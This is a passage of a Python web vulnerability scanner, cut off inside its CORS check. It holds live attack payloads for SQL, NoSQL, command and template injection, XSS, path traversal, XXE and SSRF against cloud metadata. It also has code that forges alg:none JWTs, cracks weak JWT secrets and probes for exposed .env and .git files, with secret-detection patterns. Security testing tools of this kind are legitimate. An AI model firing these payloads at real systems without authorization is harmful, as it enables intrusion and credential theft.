#!/usr/bin/env python3
"""
Vulnerability Scanner
Covers: SQLi, NoSQLi, XSS, LFI, CMDi, SSTI, SSRF, IDOR, XXE,
        JWT weaknesses, Cookie dissection, Info disclosure, CORS, Open Redirect
"""

import requests
import sys
import json
import time
import urllib3
import argparse
import html
import re
import os
import hashlib
import hmac
import random
import string
import base64
from urllib.parse import urlparse, parse_qs, urlencode, urljoin, unquote
from datetime import datetime, timezone
from collections import defaultdict
from typing import Dict, List, Optional, Tuple, Any

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ============================================================================
# CONFIGURATION
# ============================================================================

class Config:
    TIMEOUT = 15
    RATE_LIMIT_DELAY = (1, 3)
    CONFIRMATION_THRESHOLD = 2
    MAX_CRAWL_DEPTH = 2
    MAX_URLS = 50

    SQLI_PAYLOADS = [
        "'", '"', "`", "';", '";', "')", '")', "'))", '"))',
        "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
        "' UNION SELECT NULL--", "' UNION SELECT 1,2,3--",
        "' AND 1=1--", "' AND 1=2--",
        "' AND SLEEP(5)--", "' OR SLEEP(5)--", "' AND pg_sleep(5)--",
        "'; WAITFOR DELAY '0:0:5'--", "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
        "1' AND 1=1", "1' AND 1=2", "1' AND 1=1--",
        "' AND 'a'='a", "' AND 'a'='b",
        "' AND (SELECT 1523 FROM (SELECT(SLEEP(5)))x) AND 'a'='a",
        "' AND 1523=(SELECT 1523 FROM PG_SLEEP(5)) AND 'a'='a",
    ]

    NOSQL_PAYLOADS = [
        '{"$gt": ""}', '{"$gte": ""}', '{"$lt": ""}', '{"$ne": ""}',
        '{"$regex": ".*"}', '{"$exists": true}',
        '{"$where": "sleep(5000)"}', '{"$where": "this.password.length > 0"}',
        "[$ne]=1", "[$gt]=", "[$regex]=.*", "[$exists]=true",
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        '{"username": {"$regex": "^admin"}, "password": {"$gt": ""}}',
    ]

    XSS_PAYLOADS = [
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>", "<body onload=alert(1)>",
        "<input autofocus onfocus=alert(1)>", "<details open ontoggle=alert(1)>",
        "'\"><script>alert(1)</script>", "'\" onmouseover=alert(1) \"",
        "${alert(1)}", "{{constructor.constructor('alert(1)')()}}",
    ]

    LFI_PAYLOADS = [
        "../../../etc/passwd", "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "file:///etc/passwd",
        "php://filter/read=convert.base64-encode/resource=/etc/passwd",
        "..\\..\\..\\Windows\\win.ini", "C:\\Windows\\win.ini",
    ]

    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><foo>&xxe;</foo>',
    ]

    SSTI_PAYLOADS = [
        ("{{ 7*7 }}", "49"), ("{{7*7}}", "49"),
        ("{{ ''.__class__.__mro__[2].__subclasses__() }}", "subclasses"),
        ("<%= 7*7 %>", "49"), ("${7*7}", "49"), ("{7*7}", "49"),
    ]

    CMDI_PAYLOADS = [
        (";id", "uid="), ("|id", "uid="), ("`id`", "uid="),
        ("$(id)", "uid="), ("&&id", "uid="), ("||id", "uid="),
        (";cat /etc/passwd", "root:x:"), ("|cat /etc/passwd", "root:x:"),
    ]

    SSRF_PAYLOADS = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://localhost/", "http://127.0.0.1/", "http://0.0.0.0/",
        "file:///etc/passwd",
    ]

    IDOR_PATTERNS = [
        ("id", ["1", "2", "3", "100", "1000"]),
        ("user_id", ["1", "2", "3", "admin", "root"]),
        ("user", ["admin", "root", "test", "guest", "1"]),
        ("account", ["1", "2", "admin", "root"]),
        ("file", ["1", "2", "3", "test.txt", "config.txt"]),
    ]

    JWT_WEAK_SECRETS = [
        "secret", "password", "123456", "qwerty", "changeme",
        "supersecret", "mysecret", "key", "private", "token",
        "jwt_secret", "your-256-bit-secret", "auth", "api_key",
        "jwt", "jwtsecret", "", "null", "undefined", "admin",
    ]


# ============================================================================
# UTILITY
# ============================================================================

class Colors:
    HEADER = '\033[95m'; BLUE = '\033[94m'; CYAN = '\033[96m'
    GREEN = '\033[92m'; WARNING = '\033[93m'; FAIL = '\033[91m'
    END = '\033[0m'; BOLD = '\033[1m'


class Logger:
    RESULTS = []

    @classmethod
    def log(cls, test: str, status: str, detail: str, severity: str = "info",
            evidence: Dict = None, url: str = ""):
        entry = {
            "test": test, "status": status, "detail": detail,
            "severity": severity,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "evidence": evidence or {}, "url": url
        }
        cls.RESULTS.append(entry)

        color = Colors.FAIL if "VULN" in status else \
                (Colors.WARNING if any(x in status for x in ["POTENTIAL", "WARNING"]) else Colors.GREEN)

        print(f"{color}[{status}]{Colors.END} {test}: {detail[:120]}")
        if evidence and evidence.get('payload'):
            print(f"    Payload: {evidence['payload'][:80]}")

    @classmethod
    def clear(cls):
        cls.RESULTS = []


class RateLimiter:
    def __init__(self, min_delay=1.0, max_delay=3.0):
        self.min_delay = min_delay
        self.max_delay = max_delay
        self.last_request = 0
        self.consecutive_errors = 0

    def wait(self):
        delay = random.uniform(self.min_delay, self.max_delay)
        if self.consecutive_errors > 2:
            delay *= 2
        elapsed = time.time() - self.last_request
        if elapsed < delay:
            time.sleep(delay - elapsed)
        self.last_request = time.time()

    def record_error(self): self.consecutive_errors += 1
    def record_success(self): self.consecutive_errors = max(0, self.consecutive_errors - 1)


class RequestCache:
    _cache = {}

    @classmethod
    def _key(cls, url, method, data, headers):
        return hashlib.md5(
            f"{method}:{url}:{json.dumps(data, sort_keys=True)}:{json.dumps(headers, sort_keys=True)}".encode()
        ).hexdigest()

    @classmethod
    def get(cls, url, method="GET", data=None, headers=None):
        return cls._cache.get(cls._key(url, method, data, headers))

    @classmethod
    def set(cls, url, response, method="GET", data=None, headers=None):
        cls._cache[cls._key(url, method, data, headers)] = response

    @classmethod
    def clear(cls): cls._cache.clear()


# ============================================================================
# SESSION MANAGER
# ============================================================================

class SessionManager:
    def __init__(self, verify_ssl=True, auth_config=None):
        self.session = requests.Session()
        self.verify_ssl = verify_ssl
        self.auth_config = auth_config or {}
        self.rate_limiter = RateLimiter(*Config.RATE_LIMIT_DELAY)
        self._setup_auth()

    def _setup_auth(self):
        if 'bearer' in self.auth_config:
            self.session.headers['Authorization'] = f"Bearer {self.auth_config['bearer']}"
        if 'username' in self.auth_config and 'password' in self.auth_config:
            self.session.auth = (self.auth_config['username'], self.auth_config['password'])
        if 'headers' in self.auth_config:
            self.session.headers.update(self.auth_config['headers'])
        if 'cookies' in self.auth_config:
            self.session.cookies.update(self.auth_config['cookies'])

    def request(self, method, url, data=None, headers=None,
                allow_redirects=True, use_cache=False):
        if use_cache:
            cached = RequestCache.get(url, method, data, headers)
            if cached:
                return cached

        self.rate_limiter.wait()
        try:
            merged = {**self.session.headers, **(headers or {})}
            resp = self.session.request(
                method=method, url=url, data=data, headers=merged,
                verify=self.verify_ssl, timeout=Config.TIMEOUT,
                allow_redirects=allow_redirects
            )
            self.rate_limiter.record_success()
            if use_cache and method == "GET":
                RequestCache.set(url, resp, method, data, headers)
            return resp
        except requests.exceptions.RequestException as e:
            self.rate_limiter.record_error()
            return None

    def get(self, url, **kwargs): return self.request("GET", url, **kwargs)

    def post(self, url, data=None, json_data=None, **kwargs):
        if json_data:
            kwargs['headers'] = {**(kwargs.get('headers') or {}), 'Content-Type': 'application/json'}
            return self.request("POST", url, data=json.dumps(json_data), **kwargs)
        return self.request("POST", url, data=data, **kwargs)


# ============================================================================
# CRAWLER
# ============================================================================

class WebCrawler:
    def __init__(self, session, max_depth=Config.MAX_CRAWL_DEPTH, max_urls=Config.MAX_URLS):
        self.session = session
        self.max_depth = max_depth
        self.max_urls = max_urls
        self.visited = set()
        self.forms = []

    def crawl(self, start_url):
        self._crawl(start_url, 0)
        return list(self.visited), self.forms

    def _crawl(self, url, depth):
        if depth > self.max_depth or len(self.visited) >= self.max_urls or url in self.visited:
            return
        self.visited.add(url)
        resp = self.session.get(url, use_cache=True)
        if not resp or resp.status_code != 200 or 'text/html' not in resp.headers.get('Content-Type', ''):
            return
        self.forms.extend(self._extract_forms(resp.text, url))
        for link in self._extract_links(resp.text, url):
            if len(self.visited) < self.max_urls:
                self._crawl(link, depth + 1)

    def _extract_links(self, text, base_url):
        links = []
        for pattern in [r'href=["\']([^"\']+)["\']', r'action=["\']([^"\']+)["\']']:
            for m in re.finditer(pattern, text, re.IGNORECASE):
                href = m.group(1)
                if href.startswith(('javascript:', 'mailto:', '#')):
                    continue
                full = urljoin(base_url, href)
                if urlparse(full).netloc == urlparse(base_url).netloc:
                    links.append(full)
        return list(set(links))

    def _extract_forms(self, text, page_url):
        forms = []
        for fm in re.finditer(r'<form[^>]*>(.*?)</form>', text, re.DOTALL | re.IGNORECASE):
            fh = fm.group(0)
            action_m = re.search(r'action=["\']([^"\']*)["\']', fh, re.IGNORECASE)
            method_m = re.search(r'method=["\']([^"\']*)["\']', fh, re.IGNORECASE)
            inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', fh, re.IGNORECASE)
            if inputs:
                forms.append({
                    'url': urljoin(page_url, action_m.group(1) if action_m else ""),
                    'method': method_m.group(1).upper() if method_m else "GET",
                    'inputs': inputs, 'page': page_url
                })
        return forms


# ============================================================================
# BASE TESTER
# ============================================================================

class VulnerabilityTester:
    def __init__(self, session):
        self.session = session

    def confirm_vulnerability(self, url, param, payload, check_func,
                               method="GET", data=None):
        confirmations = 0
        evidence = {}

        resp = self._make_request(url, param, payload, method, data)
        if not resp:
            return False, 0, {}

        r1 = check_func(resp, payload)
        if r1:
            confirmations += 1
            evidence['initial'] = {'status': resp.status_code, 'length': len(resp.text), 'indicator': r1}

        ctrl = "safe_control_" + ''.join(random.choices(string.ascii_lowercase, k=8))
        ctrl_resp = self._make_request(url, param, ctrl, method, data)
        if ctrl_resp and not check_func(ctrl_resp, ctrl):
            confirmations += 1

        return confirmations >= Config.CONFIRMATION_THRESHOLD, confirmations, evidence

    def _make_request(self, url, param, payload, method, data):
        if method == "GET":
            return self.session.get(self._inject(url, param, payload))
        test_data = {**(data or {}), param: payload}
        return self.session.post(url, data=test_data)

    def _inject(self, url, param, payload):
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        qs[param] = [payload]
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(qs, doseq=True)}"


# ============================================================================
# INJECTION TESTERS (SQLi, NoSQLi, XSS, LFI, CMDi, SSTI, SSRF, IDOR, XXE)
# ============================================================================

class SQLiTester(VulnerabilityTester):
    ERRORS = [
        r"sql\s*(?:syntax|error|exception)", r"you have an error in your sql syntax",
        r"(mysql|sqlite|postgresql|oracle|mssql)\s*(?:error|exception)",
        r"ora-\d{4,5}", r"unclosed\s+quotation",
        r"sqlite3\.(?:operational|programming)error",
        r"incorrect\s+syntax\s+near",
    ]

    def test(self, url, params, method="GET", data=None):
        for param in params:
            def check(resp, payload):
                for p in self.ERRORS:
                    if re.search(p, resp.text, re.IGNORECASE):
                        return f"SQL error: {p[:30]}"
                return None

            for payload in Config.SQLI_PAYLOADS[:15]:
                vuln, confs, ev = self.confirm_vulnerability(url, param, payload, check, method, data)
                if vuln:
                    Logger.log("SQL Injection", "VULN", f"{param} vulnerable to SQLi",
                               "critical", {'payload': payload, 'confirmations': confs, **ev}, url)
                    return

            for payload in [p for p in Config.SQLI_PAYLOADS if 'sleep' in p.lower()][:3]:
                resp = self._make_request(url, param, payload, method, data)
                if resp and resp.elapsed.total_seconds() > 4:
                    ctrl = self._make_request(url, param, "test123", method, data)
                    if ctrl and ctrl.elapsed.total_seconds() < 2:
                        Logger.log("SQL Injection (Blind)", "VULN",
                                   f"{param} — time-based blind ({resp.elapsed.total_seconds():.1f}s)",
                                   "critical", {'payload': payload}, url)
                        return

        Logger.log("SQL Injection", "NOT DETECTED", "No SQLi indicators", "info", {}, url)


class NoSQLTester(VulnerabilityTester):
    def test(self, url, params, method="GET", data=None):
        def check(resp, payload):
            for p in [r"unexpected\s+token", r"invalid\s+json", r"mongo", r"bson"]:
                if re.search(p, resp.text, re.IGNORECASE):
                    return f"NoSQL error: {p}"
            return None

        for param in params:
            for payload in Config.NOSQL_PAYLOADS:
                vuln, confs, ev = self.confirm_vulnerability(url, param, payload, check, method, data)
                if vuln:
                    Logger.log("NoSQL Injection", "VULN", f"{param} vulnerable to NoSQLi",
                               "critical", {'payload': payload, 'confirmations': confs, **ev}, url)
                    return
        Logger.log("NoSQL Injection", "NOT DETECTED", "No NoSQLi indicators", "info")


class XSSTester(VulnerabilityTester):
    def test(self, url, params, method="GET", data=None):
        def check(resp, payload):
            if payload.lower() in resp.text.lower():
                if html.escape(payload).lower() not in resp.text.lower():
                    return "Payload reflected unencoded"
            return None

        for param in params:
            for payload in Config.XSS_PAYLOADS:
                vuln, confs, ev = self.confirm_vulnerability(url, param, payload, check, method, data)
                if vuln:
                    Logger.log("XSS", "VULN", f"{param} — reflected XSS",
                               "high", {'payload': payload, 'confirmations': confs, **ev}, url)
                    return
        Logger.log("XSS", "NOT DETECTED", "No reflected XSS", "info")


class LFITester(VulnerabilityTester):
    INDICATORS = ["root:x:", "bin:x:", "daemon:x:", "[boot loader]", "[fonts]", "for 16-bit app support"]

    def test(self, url, params, method="GET", data=None):
        def check(resp, payload):
            for ind in self.INDICATORS:
                if ind in resp.text:
                    return f"File content: {ind}"
            return None

        for param in params:
            for payload in Config.LFI_PAYLOADS:
                vuln, confs, ev = self.confirm_vulnerability(url, param, payload, check, method, data)
                if vuln:
                    Logger.log("LFI", "VULN", f"{param} vulnerable to path traversal",
                               "critical", {'payload': payload, **ev}, url)
                    return
        Logger.log("LFI", "NOT DETECTED", "No LFI indicators", "info")


class CommandInjectionTester(VulnerabilityTester):
    def test(self, url, params, method="GET", data=None):
        def check(resp, payload):
            for ind in ["uid=", "gid=", "root:", "Volume in drive", "Directory of"]:
                if ind in resp.text:
                    return f"Command output: {ind}"
            return None

        for param in params:
            for payload, _ in Config.CMDI_PAYLOADS:
                vuln, confs, ev = self.confirm_vulnerability(url, param, payload, check, method, data)
                if vuln:
                    Logger.log("Command Injection", "VULN", f"{param} — RCE",
                               "critical", {'payload': payload, **ev}, url)
                    return
        Logger.log("Command Injection", "NOT DETECTED", "No CMDi indicators", "info")


class SSTITester(VulnerabilityTester):
    def test(self, url, params, method="GET", data=None):
        for param in params:
            for payload, expected in Config.SSTI_PAYLOADS:
                def check(resp, p, exp=expected):
                    return f"Template evaluated: {exp}" if exp in resp.text else None

                vuln, confs, ev = self.confirm_vulnerability(url, param, payload, check, method, data)
                if vuln:
                    Logger.log("SSTI", "VULN", f"{param} — template injection",
                               "critical", {'payload': payload, **ev}, url)
                    return
        Logger.log("SSTI", "NOT DETECTED", "No SSTI indicators", "info")


class SSRFTester(VulnerabilityTester):
    def test(self, url, params, method="GET", data=None):
        def check(resp, payload):
            for ind in ["ami-id", "instance-id", "availability-zone", "iam/info"]:
                if ind in resp.text:
                    return f"Cloud metadata: {ind}"
            if ("localhost" in payload or "127.0.0.1" in payload) and resp.status_code == 200 and len(resp.text) > 50:
                return "Internal service accessible"
            return None

        for param in params:
            for payload in Config.SSRF_PAYLOADS:
                vuln, confs, ev = self.confirm_vulnerability(url, param, payload, check, method, data)
                if vuln:
                    Logger.log("SSRF", "VULN", f"{param} — SSRF",
                               "critical", {'payload': payload, **ev}, url)
                    return
        Logger.log("SSRF", "NOT DETECTED", "No SSRF indicators", "info")


class IDORTester(VulnerabilityTester):
    def test(self, url, params, method="GET", data=None):
        for pattern, values in Config.IDOR_PATTERNS:
            for param in [p for p in params if pattern in p.lower()]:
                responses = []
                for val in values:
                    resp = self._make_request(url, param, val, method, data)
                    if resp:
                        responses.append((val, resp.status_code,
                                          hashlib.md5(resp.text.encode()).hexdigest()[:8]))

                success = [r for r in responses if r[1] == 200]
                if len(success) >= 2 and len(set(r[2] for r in success)) > 1:
                    Logger.log("IDOR", "POTENTIAL", f"{param} — different objects returned per ID",
                               "high", {'values_tested': values, 'responses': responses}, url)
                    return
        Logger.log("IDOR", "NOT DETECTED", "No IDOR indicators", "info")


class XXETester(VulnerabilityTester):
    def test(self, url, params, method="POST", data=None):
        xml_params = [p for p in params if any(x in p.lower() for x in ['xml', 'data', 'content', 'payload'])]
        for param in xml_params:
            for payload in Config.XXE_PAYLOADS:
                resp = self.session.post(url, data=payload, headers={'Content-Type': 'application/xml'})
                if resp and ("root:x:" in resp.text or "[boot loader]" in resp.text):
                    Logger.log("XXE", "VULN", "XXE file read successful",
                               "critical", {'payload': payload[:80]}, url)
                    return
        Logger.log("XXE", "NOT DETECTED", "No XXE indicators", "info")


class OpenRedirectTester(VulnerabilityTester):
    PAYLOADS = ["http://evil.com", "//evil.com", "/\\evil.com", "https://evil.com/"]

    def test(self, url, params, method="GET", data=None):
        for param in params:
            for payload in self.PAYLOADS:
                resp = self._make_request(url, param, payload, method, data)
                if resp and resp.status_code in (301, 302, 307, 308):
                    loc = resp.headers.get('Location', '')
                    if 'evil.com' in loc:
                        Logger.log("Open Redirect", "VULN", f"{param} → {loc}",
                                   "medium", {'payload': payload, 'redirect': loc}, url)
                        return
        Logger.log("Open Redirect", "NOT DETECTED", "No open redirect", "info")


# ============================================================================
# JWT TESTER (enhanced)
# ============================================================================

class JWTTester:
    def test(self, url: str, session: SessionManager):
        resp = session.get(url)
        if not resp:
            return

        token = self._find_jwt(resp)
        if not token:
            Logger.log("JWT", "NOT DETECTED", "No JWT found in response/cookies", "info")
            return

        parts = token.split('.')
        if len(parts) != 3:
            return

        try:
            header = json.loads(base64.b64decode(parts[0] + '=='))
            payload = json.loads(base64.b64decode(parts[1] + '=='))
        except Exception as e:
            Logger.log("JWT", "ERROR", f"Could not decode: {e}", "info")
            return

        print(f"\n    [JWT Dissection]")
        print(f"      Raw:     {token[:60]}...")
        print(f"      Header:  {json.dumps(header)}")
        print(f"      Payload: {json.dumps(payload)}")

        alg = header.get('alg', 'unknown')
        issues = []

        # 1. alg:none
        if alg == 'none':
            issues.append(("CRITICAL: Algorithm 'none' — no signature verification", "critical", "VULN"))

        # 2. Try alg:none bypass
        none_token = self._forge_none(parts[0], parts[1])
        none_resp = session.get(url, headers={'Authorization': f'Bearer {none_token}'})
        if none_resp and none_resp.status_code == 200:
            issues.append(("CRITICAL: Server accepts alg:none forged token", "critical", "VULN"))

        # 3. Weak secret (HMAC algorithms)
        if alg in ('HS256', 'HS384', 'HS512'):
            cracked = self._crack(parts, alg)
            if cracked is not None:
                issues.append((f"CRITICAL: Weak secret cracked — '{cracked}'", "critical", "VULN"))
            else:
                issues.append((f"HMAC {alg} — secret not in common wordlist (not necessarily safe)", "info", "OK"))

        # 4. Asymmetric — note confusion attack vector
        if alg in ('RS256', 'RS384', 'RS512', 'ES256', 'ES384', 'ES512'):
            issues.append((f"Asymmetric alg {alg} — manual: try RS256→HS256 confusion attack using public key as HMAC secret", "medium", "WARNING"))

        # 5. Missing exp
        if 'exp' not in payload:
            issues.append(("Token has no 'exp' claim — never expires", "medium", "WARNING"))

        # 6. Sensitive data in payload
        payload_str = json.dumps(payload).lower()
        if 'password' in payload_str:
            issues.append(("Password stored in JWT payload", "high", "WARNING"))
        if 'secret' in payload_str:
            issues.append(("Secret stored in JWT payload", "high", "WARNING"))

        # 7. Privilege fields — flag for manual escalation test
        priv_keys = [k for k in payload if any(x in k.lower() for x in ('admin', 'role', 'is_admin', 'privilege', 'perm'))]
        if priv_keys:
            issues.append((f"Privilege fields in payload: {priv_keys} — try flipping values and resigning", "high", "WARNING"))

        # 8. Missing kid validation note
        if 'kid' in header:
            issues.append((f"'kid' header present: {header['kid']} — check for path traversal or SQLi in kid", "medium", "WARNING"))

        for detail, severity, status in issues:
            Logger.log("JWT", status, detail, severity, {'alg': alg, 'payload_keys': list(payload.keys())}, url)

        if not issues:
            Logger.log("JWT", "OK", f"No obvious weaknesses (alg: {alg})", "info")

    def _find_jwt(self, resp) -> Optional[str]:
        # Check Authorization header used in request
        auth = resp.request.headers.get('Authorization', '')
        if auth.startswith('Bearer '):
            t = auth[7:]
            if len(t.split('.')) == 3:
                return t

        # Check cookies
        for c in resp.cookies:
            if len(c.value.split('.')) == 3 and c.value.startswith('ey'):
                return c.value

        # Scan response body
        m = re.search(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', resp.text)
        if m:
            return m.group(0)

        return None

    def _forge_none(self, header_b64: str, payload_b64: str) -> str:
        new_header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=')
        return f"{new_header}.{payload_b64}."

    def _crack(self, parts: List[str], alg: str) -> Optional[str]:
        import hashlib as _hl
        alg_map = {'HS256': _hl.sha256, 'HS384': _hl.sha384, 'HS512': _hl.sha512}
        hash_fn = alg_map.get(alg, _hl.sha256)
        message = f"{parts[0]}.{parts[1]}".encode()

        try:
            sig = base64.urlsafe_b64decode(parts[2] + '==')
        except Exception:
            return None

        for secret in Config.JWT_WEAK_SECRETS:
            expected = hmac.new(secret.encode(), message, hash_fn).digest()
            if hmac.compare_digest(expected, sig):
                return secret
        return None


# ============================================================================
# COOKIE SECURITY + DISSECTION (enhanced)
# ============================================================================

class CookieSecurityTester:
    def test(self, url: str, session: SessionManager):
        resp = session.get(url)
        if not resp:
            return

        if not resp.cookies and 'Set-Cookie' not in resp.headers:
            Logger.log("Cookie Security", "OK", "No cookies set", "info")
            return

        raw_header = resp.headers.get('Set-Cookie', '')
        issues = []

        print(f"\n    [Cookie Dissection]")

        for cookie in resp.cookies:
            print(f"\n      Name:     {cookie.name}")
            print(f"      Value:    {cookie.value[:50]}{'...' if len(cookie.value) > 50 else ''}")

            # Decode / classify value
            decoded_type = self._classify_value(cookie.value)
            print(f"      Encoding: {decoded_type}")

            # Find raw header line for this cookie
            raw = self._raw_for(cookie.name, raw_header)

            secure = cookie.secure
            httponly = bool(raw and 'httponly' in raw.lower())
            ss_m = re.search(r'samesite=(\w+)', raw, re.IGNORECASE) if raw else None
            samesite = ss_m.group(1) if ss_m else None
            domain = cookie.domain or 'not set'
            path = cookie.path or '/'

            print(f"      Secure:   {'YES' if secure else 'NO  ← missing'}")
            print(f"      HttpOnly: {'YES' if httponly else 'NO  ← XSS can steal this'}")
            print(f"      SameSite: {samesite if samesite else 'NOT SET  ← CSRF risk'}")
            print(f"      Domain:   {domain}")
            print(f"      Path:     {path}")
            print(f"      Length:   {len(cookie.value)} chars")

            if not secure:
                issues.append(f"{cookie.name}: missing Secure flag (transmitted over HTTP)")
            if not httponly:
                issues.append(f"{cookie.name}: missing HttpOnly (stealable via XSS)")
            if not samesite:
                issues.append(f"{cookie.name}: missing SameSite (CSRF risk)")
            elif samesite.lower() == 'none' and not secure:
                issues.append(f"{cookie.name}: SameSite=None without Secure")
            if len(cookie.value) < 16:
                issues.append(f"{cookie.name}: value only {len(cookie.value)} chars — may be predictable")

        if issues:
            Logger.log("Cookie Security", "WARNING", f"{len(issues)} issue(s) found",
                       "medium", {'issues': issues}, url)
            for i in issues:
                print(f"      [!] {i}")
        else:
            Logger.log("Cookie Security", "OK", "All cookies: Secure + HttpOnly + SameSite present", "info")

    def _classify_value(self, value: str) -> str:
        # JWT
        if len(value.split('.')) == 3 and value.startswith('ey'):
            try:
                json.loads(base64.b64decode(value.split('.')[0] + '=='))
                return "JWT — see JWT tester results above"
            except Exception:
                pass

        # JSON
        try:
            json.loads(value)
            return f"JSON: {value[:60]}"
        except Exception:
            pass

        # Base64
        try:
            decoded = base64.b64decode(value + '==').decode('utf-8', errors='strict')
            if decoded.isprintable() and len(decoded) > 3:
                return f"base64 → {decoded[:60]}"
        except Exception:
            pass

        # URL-encoded
        decoded_url = unquote(value)
        if decoded_url != value:
            return f"URL-encoded → {decoded_url[:60]}"

        # Hex
        if re.match(r'^[0-9a-fA-F]+$', value) and len(value) % 2 == 0:
            return f"hex ({len(value)//2} bytes)"

        return f"opaque string ({len(value)} chars)"

    def _raw_for(self, name: str, all_set_cookie: str) -> Optional[str]:
        for part in all_set_cookie.split(','):
            if re.match(rf'\s*{re.escape(name)}\s*=', part):
                return part
        return None


# ============================================================================
# INFORMATION DISCLOSURE TESTER (new)
# ============================================================================

class InfoDisclosureTester:
    SENSITIVE_PATHS = [
        "/.env", "/.env.local", "/.env.production", "/.env.backup", "/.env.example",
        "/.git/HEAD", "/.git/config", "/.gitignore", "/.git/COMMIT_EDITMSG",
        "/phpinfo.php", "/info.php", "/test.php", "/debug.php",
        "/config.php", "/config.json", "/config.yml", "/config.yaml",
        "/composer.json", "/composer.lock", "/package.json", "/package-lock.json",
        "/web.config", "/WEB-INF/web.xml", "/.htaccess", "/.htpasswd",
        "/backup.zip", "/backup.sql", "/dump.sql", "/db.sql", "/database.sql",
        "/server-status", "/server-info",
        "/actuator", "/actuator/env", "/actuator/health", "/actuator/mappings", "/actuator/beans",
        "/debug", "/console", "/_profiler", "/trace",
        "/swagger.json", "/swagger-ui.html", "/api-docs", "/openapi.json",
        "/v1/api-docs", "/v2/api-docs", "/v3/api-docs",
        "/robots.txt", "/sitemap.xml", "/.well-known/security.txt",
        "/wp-config.php", "/wp-config.php.bak", "/wp-config.php~",
        "/Dockerfile", "/docker-compose.yml", "/Makefile",
        "/.DS_Store", "/Thumbs.db",
        "/error_log", "/access_log", "/debug.log", "/application.log",
    ]

    SECRET_PATTERNS = [
        (r'AKIA[0-9A-Z]{16}', "AWS Access Key ID"),
        (r'(?i)aws[_-]?secret[_-]?access[_-]?key[\s]*[:=][\s]*["\']?([A-Za-z0-9/+]{40})', "AWS Secret Key"),
        (r'ghp_[a-zA-Z0-9]{36}', "GitHub PAT"),
        (r'github_pat_[a-zA-Z0-9_]{82}', "GitHub Fine-Grained PAT"),
        (r'sk-[a-zA-Z0-9]{48}', "OpenAI API Key"),
        (r'(?i)(api[_-]?key|apikey)[\s]*[:=][\s]*["\']([A-Za-z0-9_\-]{20,})["\']', "API Key"),
        (r'(?i)(secret[_-]?key|app[_-]?secret)[\s]*[:=][\s]*["\']([A-Za-z0-9_\-]{16,})["\']', "Secret Key"),
        (r'(?i)(password|passwd|pwd)[\s]*[:=][\s]*["\']([^\s"\']{6,})["\']', "Hardcoded Password"),
        (r'(?i)(mysql|postgresql|sqlite|mssql|mongodb)://[^\s"\'<>]+', "DB Connection String"),
        (r'\b(?:10|172\.(?:1[6-9]|2\d|3[01])|192\.168)\.\d{1,3}\.\d{1,3}\b', "Internal IP Address"),
        (r'(?i)(traceback|stack\s*trace|at\s+\w+\.\w+\([\w.]+:\d+\))', "Stack Trace"),
        (r'(?i)(exception|fatal\s+error|unhandled\s+exception).{0,200}(line\s+\d+|at\s+\w+)', "Verbose Error Message"),
        (r'(?i)X-Debug-Token|X-Powered-By|X-AspNet-Version', "Debug/Version Header"),
    ]

    def test(self, base_url: str, session: SessionManager):
        parsed = urlparse(base_url)
        origin = f"{parsed.scheme}://{parsed.netloc}"

        found = []
        print(f"\n    [Info Disclosure — {len(self.SENSITIVE_PATHS)} paths]")

        for path in self.SENSITIVE_PATHS:
            url = origin + path
            resp = session.get(url)
            if not resp:
                continue

            if resp.status_code == 200 and len(resp.text) > 30:
                found.append((path, len(resp.text)))
                print(f"      [200 EXPOSED] {path} ({len(resp.text)} bytes)")
                self._scan_secrets(path, resp.text, url)

            elif resp.status_code in (401, 403):
                print(f"      [{resp.status_code} EXISTS ] {path}")

        # Scan main page and common response headers
        main = session.get(base_url)
        if main:
            self._scan_secrets("/", main.text, base_url)
            self._check_headers(main, base_url)

        if found:
            critical = [p for p, _ in found if p in ('/.env', '/.git/HEAD', '/phpinfo.php', '/actuator/env')]
            level = "VULN" if critical else "POTENTIAL"
            Logger.log("Info Disclosure", level,
                       f"{len(found)} sensitive path(s) exposed: {[p for p, _ in found[:5]]}",
                       "high" if critical else "medium", {'paths': found}, base_url)
        else:
            Logger.log("Info Disclosure", "NOT DETECTED", "No sensitive paths exposed", "info")

    def _scan_secrets(self, path: str, text: str, url: str):
        for pattern, label in self.SECRET_PATTERNS:
            m = re.search(pattern, text)
            if m:
                snippet = m.group(0)[:80]
                Logger.log("Info Disclosure", "POTENTIAL",
                           f"{label} in {path}: {snippet}",
                           "high", {'pattern': label, 'match': snippet}, url)

    def _check_headers(self, resp, url: str):
        disclosures = []
        for h in ('Server', 'X-Powered-By', 'X-AspNet-Version', 'X-Generator'):
            val = resp.headers.get(h)
            if val:
                disclosures.append(f"{h}: {val}")
        if disclosures:
            Logger.log("Info Disclosure", "WARNING",
                       "Version/tech info in headers: " + "; ".join(disclosures),
                       "low", {'headers': disclosures}, url)


# ============================================================================
# CORS + SECURITY HEADERS
# ============================================================================

class CORSTester:
    def test(self, url: str, session: SessionManager):
        resp = session.get(url, headers={'Origin': 'https://evil.com'})
        if not resp:
            return
        acao = resp.headers.get('Access-Control-Allow-Origin', '')
        acac = resp.headers.get('Access-Control-Allow-Credentials', '')
        if 'evil.com' in acao and acac.lower() == 'true':
            Logger.log("CORS", "VULN", f"Origin reflection + credentials: ACAO={acao}",
                       "high", {'acao': acao, 'acac': acac}, url)
        elif acao == '*':
